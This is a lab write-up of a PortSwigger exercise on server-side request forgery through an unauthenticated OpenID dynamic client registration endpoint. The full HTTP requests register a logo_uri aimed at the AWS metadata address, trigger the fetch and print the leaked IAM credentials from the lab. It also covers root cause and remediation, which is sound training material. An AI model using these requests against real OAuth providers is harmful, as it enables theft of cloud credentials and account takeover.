# SSRF via OpenID Dynamic Client Registration

**Platform:** PortSwigger Web Security Academy
**Category:** Server-Side Request Forgery / OpenID Connect / OAuth 2.0
**Difficulty:** Practitioner
**Date Solved:** 2026-10-26
**Severity:** Critical

## Summary

The OAuth/OpenID provider exposes an **unauthenticated dynamic client registration endpoint** (`POST /reg`), letting anyone register a brand-new OAuth client application with arbitrary metadata — no auth required. One of the accepted fields, `logo_uri`, is later fetched **server-side** by the provider whenever `GET /client/{client_id}/logo` is requested (used to render the client app's logo on the user consent/"Authorize" screen). The server never restricts or validates what `logo_uri` can point to, so an attacker can register a client with `logo_uri` set to the cloud instance metadata endpoint and have the OAuth server fetch it on the attacker's behalf — classic SSRF, with the response body (including secrets) reflected straight back.

## Affected Component

- `GET /.well-known/openid-configuration` — public OpenID discovery document; reveals the registration endpoint location (`/reg`)
- `POST /reg` — dynamic client registration endpoint (RFC 7591 style). Accepts unauthenticated registration with attacker-controlled `redirect_uris` and `logo_uri`
- `GET /client/{client_id}/logo` — fetches and proxies back whatever URL is stored in that client's `logo_uri`, with no allowlist/validation on scheme or destination (no SSRF protections — no blocking of link-local/metadata ranges)

## Steps to Reproduce

1. While proxying through Burp, browsed to the OAuth server's discovery document:
   ```
   GET /.well-known/openid-configuration HTTP/2
   Host: oauth-<lab-id>.oauth-server.net
   ```
   This returned the server's configuration, including `registration_endpoint`, confirming dynamic registration is live at `/reg`.

   First attempt at `POST /reg` initially returned `421 Misdirected Request` / `"Invalid host"` — traced to sending the request against a stale/mismatched `Host` header from a different Repeater tab rather than a fresh capture of the actual OAuth server host for this lab instance. Re-captured the request from a fresh browser navigation through Burp proxy and the host matched correctly on retry.

2. Registered a fake client application with no authentication at all:
   ```http
   POST /reg HTTP/2
   Host: oauth-<lab-id>.oauth-server.net
   Content-Type: application/json

   {
       "redirect_uris": ["https://example.com"]
   }
   ```
   Response: `201 Created`, returning a full client metadata object including a freshly issued `client_id` and `client_secret`. No credentials, no CSRF token, nothing stopped this — anyone can register a client.

3. Audited the OAuth consent flow in Burp's proxy history and noticed the "Authorize" page (where the user approves "App X wants access to...") loads the client's logo via:
   ```
   GET /client/{client_id}/logo
   ```
   and that `logo_uri` is a field accepted during registration (per the OpenID Dynamic Client Registration spec).

4. Re-sent `POST /reg`, this time including `logo_uri` pointed at the real target — AWS EC2/ECS instance metadata service for IAM credentials:
   ```http
   POST /reg HTTP/2
   Host: oauth-<lab-id>.oauth-server.net
   Content-Type: application/json

   {
       "redirect_uris": ["https://example.com"],
       "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
   }
   ```
   Response: `201 Created` with a new `client_id`, confirming `logo_uri` was accepted verbatim with no validation of scheme, host, or destination (no block on `169.254.169.254` / link-local ranges).

5. Took the new `client_id` from that response and requested its logo:
   ```
   GET /client/{new_client_id}/logo HTTP/2
   Host: oauth-<lab-id>.oauth-server.net
   ```

6. The server performed the fetch **itself**, server-side, and returned the response body of the internal request directly back to the attacker — the full IAM role credentials for `admin`, including the secret access key. Lab solved.

## Proof of Concept

**Registration request (abusing `logo_uri`):**
```http
POST /reg HTTP/2
Host: oauth-0a5000e7036e082c8060fb9d02b00025.oauth-server.net
Content-Type: application/json

{
    "redirect_uris": ["https://example.com"],
    "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```

**Registration response:**
```json
{
    "client_id": "M54waQqdi1YZXk4_MlAUu",
    "client_secret": "SzA8XCA8jdl3D9htT4BJp0FPkCy_LHUebzkMtO1waV0A744bB9XAVQiRuGJDKmMpW2SJgzV_qtgnKkrY-aAnxw",
    "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/",
    "redirect_uris": ["https://example.com"],
    "registration_client_uri": "https://oauth-0a5000e7036e082c8060fb9d02b00025.oauth-server.net/reg/M54waQqdi1YZXk4_MlAUu"
}
```

**Triggering the server-side fetch:**
```http
GET /client/M54waQqdi1YZXk4_MlAUu/logo HTTP/2
Host: oauth-0a5000e7036e082c8060fb9d02b00025.oauth-server.net
```

**Response — leaked IAM credentials:**
```json
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8

{
    "Code": "Success",
    "LastUpdated": "2026-10-26T14:41:49.899136019Z",
    "Type": "AWS-HMAC",
    "AccessKeyId": "5akz0LEHAQ1Eznhe5AXj",
    "SecretAccessKey": "u77VVEovHsBEROAgMGazG1UOLT7NLMiOmH96bpy4",
    "Token": "uvCQ0HtzSRjQSFyRX3atEJGiybV5NetV93bicAEEGYnPVPrc8VRfZNZHhwjksWsqEXRwggPTr9krgl2NbUy2IwnbT1aQ7sQz5HCL2kXIsAhQMZbjTg4LvSXl9AeRTFjleIC2uK6Aov933krnqz7ocYtfh93zWeGl02Adae7y4u8cRKeqI1Rxlanq484zwML1HToOVtzlLYm8VeBtNzpEXEWyC4g4DKlrNIll5n75vKlnoE2TGlsISyaCfyBAOgS29m",
    "Expiration": "2032-10-24T14:41:49.899136019Z"
}
```

Screenshot of the PoC response in Burp Repeater: [`assets/ssrf-openid-dynamic-client-registration-poc.png`](<../assets/ssrf-openid-dynamic-client-registration-poc.png>)

Submitted `SecretAccessKey` value `u77VVEovHsBEROAgMGazG1UOLT7NLMiOmH96bpy4` to solve the lab.

## Root Cause

OpenID Connect Dynamic Client Registration (RFC 7591) is designed to let legitimate client applications self-register with an authorization server. This implementation has two compounding failures:

1. **No authentication/authorization gate on `/reg`.** Dynamic registration should, at minimum, require some form of initial access token or admin approval — here it's completely open, so anyone can mint arbitrary client applications with arbitrary metadata.
2. **`logo_uri` is fetched server-side with zero SSRF protections.** The server treats the client-supplied `logo_uri` as a trusted, safe-to-fetch URL and retrieves it directly — no scheme allowlist (blocking anything but `https://`), no DNS/IP validation to block link-local (`169.254.0.0/16`), loopback, or internal RFC1918 ranges, and critically, it reflects the raw response body back to whoever requests `/client/{id}/logo` instead of just rendering it as an `<img>` (which would at least limit exfiltration to image-parseable content).

Combined, this is a textbook SSRF-via-metadata-field pattern: any field accepted during an unauthenticated self-service registration step that is later fetched server-side is a candidate for this attack.

## Impact

**Technical**
- Full server-side request forgery — arbitrary internal/cloud-metadata HTTP GET requests from the OAuth provider's own network position
- Direct theft of the cloud provider's IAM role credentials (AWS instance metadata `/latest/meta-data/iam/security-credentials/{role}/`), valid until 2032 in this case
- No authentication required anywhere in the chain — fully unauthenticated, remote, zero-click (from the perspective of any legitimate user)

**Business / Real-World**
- Stolen IAM credentials for an `admin`-named role could grant full control over the underlying AWS account/resources the OAuth server runs in — S3 buckets, EC2 instances, other secrets in Secrets Manager, etc., far beyond the OAuth service itself
- SSRF via metadata endpoints is one of the highest-value cloud bug classes (see Capital One 2019 breach) — this is a real-world-equivalent critical, not a lab toy
- Because registration is unauthenticated, this is exploitable by literally anyone who finds the OpenID discovery document — no account, no social engineering, no victim interaction

**Scope**
- The OAuth/OpenID provider's host network and any cloud credentials/resources reachable from it
- Potentially the entire AWS account backing the OAuth service, depending on the `admin` role's actual IAM policy

## Remediation

- Require authentication (e.g., an initial access token issued out-of-band) before permitting dynamic client registration, per RFC 7591 best practice — don't leave `/reg` open to the internet.
- Validate and restrict `logo_uri` (and any other server-fetched client metadata URL) to `https://` only, and block requests to link-local, loopback, and private IP ranges (169.254.0.0/16, 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16) at the network layer — ideally via an egress allowlist/proxy, not just application-level regex.
- Never reflect the raw body of a server-side fetch back to the requester. If a logo must be displayed, proxy it through strict content-type/image validation and re-encode it — don't pass through arbitrary response bytes.
- Enforce IMDSv2 (session-token-required) on the underlying cloud instances so a basic unauthenticated metadata GET can't retrieve credentials even if SSRF occurs.

## Lessons Learned & Patterns

- **Unauthenticated self-service registration endpoints are a goldmine.** Any time a server exposes a way to register metadata about yourself (an app, a webhook, a client) without auth, check every URL-shaped field for server-side fetch behavior — `logo_uri`, `webhook_url`, `redirect_uri`, `jwks_uri` are all classic SSRF injection points in the OAuth/OIDC spec family.
- **Always check `.well-known/openid-configuration` first** on any OAuth/OIDC target — it's an unauthenticated map of every available endpoint, including registration, token, and revocation endpoints that aren't linked anywhere in the UI.
- **Confirm the sink before going for the real target.** The lab solution path calls for pointing `logo_uri` at a Burp Collaborator URL first to confirm the server-side fetch actually fires, before swapping in the real metadata URL — skipped that step this run since the mechanism was already obvious from source-reading the registration spec and the `/client/{id}/logo` request, and it worked first try. Worth noting that skipping confirmation is a bit of a gamble: if the "real" target had required multiple attempts, a Collaborator check first would isolate "is this field even fetched server-side" from "is 169.254.169.254 specifically reachable," saving debugging time. Use the Collaborator-first order on unfamiliar/production targets.
- **421 Misdirected Request / "Invalid host" on HTTP/2 repeater requests** usually means the request's `Host` header doesn't match the TLS SNI/connection context — almost always from reusing or hand-editing a stale Repeater tab's request against a different lab instance's host, rather than capturing fresh. Re-capture from a live browser action through the proxy rather than hand-fixing the host string.
- **Reusable technique for future targets:** on any OAuth provider, check whether `/reg` (or any `registration_endpoint` from discovery) is open without auth. If so, every metadata field is worth testing for server-side fetch via Collaborator, specifically targeting cloud metadata IPs once fetch behavior is confirmed.

## References

- PortSwigger Lab: SSRF via OpenID dynamic client registration
- RFC 7591: OAuth 2.0 Dynamic Client Registration Protocol
- AWS: Instance Metadata Service (IMDS) and the case for IMDSv2

**Tags:** #PortSwigger #OAuth #OpenIDConnect #SSRF #CloudMetadata #DynamicClientRegistration
